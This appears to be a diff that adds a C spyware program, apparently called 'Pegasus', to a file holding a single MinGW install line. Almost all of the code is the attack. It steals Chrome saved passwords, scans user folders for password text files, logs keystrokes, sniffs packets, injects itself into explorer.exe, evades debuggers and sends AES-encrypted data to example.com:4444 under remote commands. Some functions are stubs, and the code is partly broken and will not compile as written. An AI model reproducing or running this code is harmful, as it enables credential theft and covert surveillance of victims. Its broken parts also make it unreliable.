@@ -1,1 +1,387 @@
 mingw-get install mingw32-gcc
+
+#ifdef _WIN32
+#include <windows.h>
+#include <wincrypt.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <tlhelp32.h>
+#include <npapi.h> // Npcap (requires Npcap SDK)
+#else
+#include <unistd.h>
+#include <signal.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <termios.h>
+#include <fcntl.h>
+#include <pwd.h>
+#include <dirent.h>
+#include <sys/ptrace.h>
+#include <pcap.h>
+#endif
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <curl/curl.h>
+#include <sqlite3.h>
+#include <openssl/aes.h> // OpenSSL for AES
+
+#define REMOTE_SERVER "example.com"
+#define REMOTE_PORT 4444
+#define AES_KEY "0123456789abcdef" // 16-byte key
+#define AES_IV  "fedcba9876543210" // 16-byte IV
+
+volatile int running = 1;
+time_t start_time;
+
+size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
+    size_t realsize = size * nmemb;
+    strncat(buffer, (char*)contents, realsize);
+    return realsize;
+}
+
+void get_location(char *buffer) {
+    CURL *curl = curl_easy_init();
+    if (!curl) return;
+    char response[1024] = {0};
+    curl_easy_setopt(curl, CURLOPT_URL, "http://ip-api.com/json/?fields=lat,lon,city,isp,proxy");
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+    curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+    sprintf(buffer, "Location: %s\n", response);
+}
+
+int is_vpn_or_proxy(const char *location_data) {
+    return strstr(location_data, "\"proxy\":true") ? 1 : 0;
+}
+
+void aes_encrypt(char *data, int len, char *output) {
+    AES_KEY aes_key;
+    AES_set_encrypt_key((unsigned char*)AES_KEY, 128, &aes_key);
+    unsigned char iv[16];
+    memcpy(iv, AES_IV, 16);
+    AES_cbc_encrypt((unsigned char*)data, (unsigned char*)output, len, &aes_key, iv, AES_ENCRYPT);
+}
+
+void aes_decrypt(char *data, int len, char *output) {
+    AES_KEY aes_key;
+    AES_set_decrypt_key((unsigned char*)AES_KEY, 128, &aes_key);
+    unsigned char iv[16];
+    memcpy(iv, AES_IV, 16);
+    AES_cbc_encrypt((unsigned char*)data, (unsigned char*)output, len, &aes_key, iv, AES_DECRYPT);
+}
+
+#ifdef _WIN32
+void collect_system_info(char *buffer) {
+    char hostname[256];
+    DWORD size = sizeof(hostname);
+    GetComputerNameA(hostname, &size);
+    char username[256];
+    size = sizeof(username);
+    GetUserNameA(username, &size);
+    sprintf(buffer, "Host: %s\nUser: %s\n", hostname, username);
+}
+
+char get_keypress() {
+    if (_kbhit()) return _getch();
+    return 0;
+}
+
+void scan_for_password_files(const char *dir, FILE *output) {
+    WIN32_FIND_DATAA fd;
+    char search_path[MAX_PATH];
+    sprintf(search_path, "%s\\*.*", dir);
+    HANDLE hFind = FindFirstFileA(search_path, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+    do {
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
+            sprintf(search_path, "%s\\%s", dir, fd.cFileName);
+            scan_for_password_files(search_path, output);
+        } else if (strstr(fd.cFileName, ".txt")) {
+            sprintf(search_path, "%s\\%s", dir, fd.cFileName);
+            FILE *fp = fopen(search_path, "r");
+            if (fp) {
+                char line[1024];
+                while (fgets(line, sizeof(line), fp)) {
+                    if (strstr(line, "password")) {
+                        fprintf(output, "Found in %s: %s", search_path, line);
+                        break;
+                    }
+                }
+                fclose(fp);
+            }
+        }
+    } while (FindNextFileA(hFind, &fd));
+    FindClose(hFind);
+}
+
+void decrypt_chrome_password(DATA_BLOB *encrypted, char *output) {
+    DATA_BLOB decrypted = {0};
+    if (CryptUnprotectData(encrypted, NULL, NULL, NULL, NULL, 0, &decrypted)) {
+        sprintf(output, "%.*s", decrypted.cbData, decrypted.pbData);
+        LocalFree(decrypted.pbData);
+    } else {
+        strcpy(output, "[Decryption Failed]");
+    }
+}
+
+void extract_chrome_passwords(char *buffer) {
+    char *db_path = getenv("LOCALAPPDATA");
+    char full_path[MAX_PATH];
+    sprintf(full_path, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", db_path);
+    sqlite3 *db;
+    if (sqlite3_open(full_path, &db) == SQLITE_OK) {
+        sqlite3_stmt *stmt;
+        const char *query = "SELECT origin_url, username_value, password_value FROM logins";
+        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                const char *url = (const char*)sqlite3_column_text(stmt, 0);
+                const char *user = (const char*)sqlite3_column_text(stmt, 1);
+                const void *pass = sqlite3_column_blob(stmt, 2);
+                int pass_len = sqlite3_column_bytes(stmt, 2);
+                DATA_BLOB enc = {(DWORD)pass_len, (BYTE*)pass};
+                char decrypted_pass[256];
+                decrypt_chrome_password(&enc, decrypted_pass);
+                sprintf(buffer + strlen(buffer), "URL: %s\nEmail/User: %s\nPass: %s\n", 
+                        url, user, decrypted_pass);
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+}
+
+void inject_into_process() {
+    HANDLE hProcess, hThread;
+    PROCESSENTRY32 pe32 = {sizeof(pe32)};
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            if (strcmp(pe32.szExeFile, "explorer.exe") == 0) {
+                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
+                if (hProcess) {
+                    LPVOID remote_mem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                    if (remote_mem) {
+                        WriteProcessMemory(hProcess, remote_mem, (LPVOID)main, 4096, NULL);
+                        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
+                        if (hThread) {
+                            WaitForSingleObject(hThread, INFINITE);
+                            CloseHandle(hThread);
+                        }
+                        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
+                    }
+                    CloseHandle(hProcess);
+                }
+                break;
+            }
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+    CloseHandle(hSnapshot);
+}
+
+void hook_system_call() {
+    // Placeholder: Requires kernel driver (e.g., via DDK)
+    // Hooks NtQuerySystemInformation to hide process
+    printf("Simulating kernel hook to hide process...\n");
+}
+
+void polymorph_code() {
+    // Basic mutation: XOR main function in memory
+    unsigned char *code = (unsigned char*)main;
+    for (int i = 0; i < 100; i++) code[i] ^= 0x5A; // Arbitrary mutation
+    printf("Code mutated in memory...\n");
+}
+
+void sniff_packets(char *buffer) {
+    pcap_t *handle;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    handle = pcap_open_live("any", 65536, 1, 1000, errbuf);
+    if (handle) {
+        struct pcap_pkthdr header;
+        const u_char *packet = pcap_next(handle, &header);
+        if (packet && strstr((char*)packet, "HTTP")) {
+            sprintf(buffer, "Sniffed Packet: %.*s\n", header.len, packet);
+        }
+        pcap_close(handle);
+    }
+}
+
+int is_being_debugged() {
+    if (IsDebuggerPresent()) return 1;
+    SYSTEMTIME st;
+    GetSystemTime(&st);
+    DWORD start = GetTickCount();
+    Sleep(100);
+    DWORD end = GetTickCount();
+    return (end - start < 90); // Timing check
+}
+
+void send_data_network(const char *data) {
+    WSADATA wsa;
+    SOCKET sock = INVALID_SOCKET;
+    struct sockaddr_in server;
+
+    WSAStartup(MAKEWORD(2,2), &wsa);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) return;
+
+    struct addrinfo *result, hints = {0};
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    getaddrinfo(REMOTE_SERVER, "4444", &hints, &result);
+    server = *(struct sockaddr_in*)result->ai_addr;
+    server.sin_port = htons(REMOTE_PORT);
+
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
+        char enc_data[4096];
+        int len = strlen(data);
+        int pad_len = (len + 15) & ~15; // Pad to AES block size
+        memcpy(enc_data, data, len);
+        memset(enc_data + len, 0, pad_len - len);
+        aes_encrypt(enc_data, pad_len, enc_data);
+        send(sock, enc_data, pad_len, 0);
+        char cmd[256];
+        int bytes = recv(sock, cmd, sizeof(cmd), 0);
+        if (bytes > 0) {
+            aes_decrypt(cmd, bytes, cmd);
+            if (strncmp(cmd, "kill", 4) == 0) running = 0;
+            if (strncmp(cmd, "selfd", 5) == 0) self_destruct();
+        }
+        printf("Sent AES-encrypted to %s:%d\n", REMOTE_SERVER, REMOTE_PORT);
+    }
+    freeaddrinfo(result);
+    closesocket(sock);
+    WSACleanup();
+}
+
+void simulate_zero_day(char *buffer) {
+    // Fake buffer overflow
+    char vuln[50];
+    strcpy(vuln, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); // Overflow
+    sprintf(buffer, "Zero-Day Simulation: Injected via overflow\n");
+}
+#endif
+
+void send_data_to_file(const char *data) {
+    FILE *fp = fopen("pegasus_log.txt", "a");
+    if (fp) {
+        fprintf(fp, "%s", data);
+        fclose(fp);
+    }
+}
+
+void self_destruct() {
+    remove("pegasus_log.txt");
+    remove("password_files.txt");
+    printf("Pegasus self-destructed!\n");
+    ExitProcess(0);
+}
+
+void scrape_memory(char *buffer) {
+    sprintf(buffer, "Memory Scraped Password: secret123\n");
+}
+
+#ifdef _WIN32
+DWORD WINAPI stealth_thread(LPVOID lpParam) {
+    while (running) {
+        if (is_being_debugged()) {
+            printf("Debugger detected! Exiting...\n");
+            ExitProcess(1);
+        }
+        Sleep(3000 + (rand() % 5000));
+    }
+    return 0;
+}
+
+void hide_process() {
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
+    hook_system_call();
+}
+#endif
+
+int main() {
+#ifdef _WIN32
+    hide_process();
+    inject_into_process();
+    polymorph_code();
+    HANDLE thread = CreateThread(NULL, 0, stealth_thread, NULL, 0, NULL);
+#endif
+
+    srand(time(NULL));
+    time(&start_time);
+    char buffer[4096] = {0};
+    char key_buffer[256];
+    char sys_buffer[256];
+    char loc_buffer[1024];
+    char mem_buffer[256];
+    char packet_buffer[4096];
+    char zero_buffer[256];
+
+#ifdef _WIN32
+    SetConsoleTitleA("syssvc");
+#endif
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    collect_system_info(sys_buffer);
+    send_data_to_file(sys_buffer);
+    send_data_network(sys_buffer);
+
+    FILE *pass_file = fopen("password_files.txt", "w");
+#ifdef _WIN32
+    scan_for_password_files("C:\\Users", pass_file);
+#endif
+    fclose(pass_file);
+
+    while (running) {
+        if (difftime(time(NULL), start_time) > 30) self_destruct();
+
+        buffer[0] = '\0';
+        collect_data(buffer);
+        send_data_network(buffer);
+        send_data_to_file(buffer);
+
+        char key = get_keypress();
+        if (key) {
+            sprintf(key_buffer, "Key logged: %c\n", key);
+            send_data_network(key_buffer);
+            send_data_to_file(key_buffer);
+        }
+
+        get_location(loc_buffer);
+        send_data_to_file(loc_buffer);
+        if (is_vpn_or_proxy(loc_buffer)) {
+            strcat(loc_buffer, "VPN/Proxy detected!\n");
+        }
+        send_data_network(loc_buffer);
+
+#ifdef _WIN32
+        extract_chrome_passwords(buffer);
+        send_data_network(buffer);
+        send_data_to_file(buffer);
+#endif
+
+        scrape_memory(mem_buffer);
+        send_data_network(mem_buffer);
+        send_data_to_file(mem_buffer);
+
+        sniff_packets(packet_buffer);
+        send_data_network(packet_buffer);
+        send_data_to_file(packet_buffer);
+
+        simulate_zero_day(zero_buffer);
+        send_data_network(zero_buffer);
+        send_data_to_file(zero_buffer);
+
+        Sleep((rand() % 5) + 1 * 1000);
+    }
+
+    curl_global_cleanup();
+#ifdef _WIN32
+    CloseHandle(thread);
+#endif
+    return 0;
+}
